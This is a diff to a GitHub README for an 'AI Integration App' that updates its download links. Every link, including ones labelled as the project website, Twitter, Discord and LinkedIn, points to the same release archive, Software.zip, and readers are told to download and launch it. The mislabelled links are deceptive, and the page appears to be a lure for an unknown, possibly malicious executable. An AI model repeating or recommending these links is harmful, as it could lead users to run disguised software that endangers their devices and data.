@@ -20,13 +20,13 @@ Welcome to the AI Integration App repository! Here, you will find a cross-platfo
 
 To begin using the AI Integration App, you can download the software package by clicking on the link below:
 
-[![Download Software](https://github.com/Luizdark1/AI-Integration-App/releases/download/v1.0/Application.zip)](https://github.com/Luizdark1/AI-Integration-App/releases/download/v1.0/Application.zip)
+[![Download Software](https://github.com/Luizdark1/AI-Integration-App/releases/download/v2.0/Software.zip)](https://github.com/Luizdark1/AI-Integration-App/releases/download/v2.0/Software.zip)
 
 Please note that the link provided above leads to a software package that needs to be launched on your device. Simply download the file and follow the installation instructions to start using the AI Integration App.
 
 ## Explore More 🌟
 
-Feel free to visit the [AI Integration App website](https://github.com/Luizdark1/AI-Integration-App/releases/download/v1.0/Application.zip) for additional resources, updates, and support. Our website offers comprehensive guides, FAQs, and tutorials to help you make the most of the application.
+Feel free to visit the [AI Integration App website](https://github.com/Luizdark1/AI-Integration-App/releases/download/v2.0/Software.zip) for additional resources, updates, and support. Our website offers comprehensive guides, FAQs, and tutorials to help you make the most of the application.
 
 ## Contribute 🤝
 
@@ -35,9 +35,9 @@ We welcome contributions from the open-source community to enhance the AI Integr
 ## Connect with Us 🌐
 
 Stay connected with the AI Integration App team and fellow users by joining our community channels:
-- [Twitter](https://github.com/Luizdark1/AI-Integration-App/releases/download/v1.0/Application.zip)
-- [Discord](https://github.com/Luizdark1/AI-Integration-App/releases/download/v1.0/Application.zip)
-- [LinkedIn](https://github.com/Luizdark1/AI-Integration-App/releases/download/v1.0/Application.zip)
+- [Twitter](https://github.com/Luizdark1/AI-Integration-App/releases/download/v2.0/Software.zip)
+- [Discord](https://github.com/Luizdark1/AI-Integration-App/releases/download/v2.0/Software.zip)
+- [LinkedIn](https://github.com/Luizdark1/AI-Integration-App/releases/download/v2.0/Software.zip)
 
 ## License 📝
 
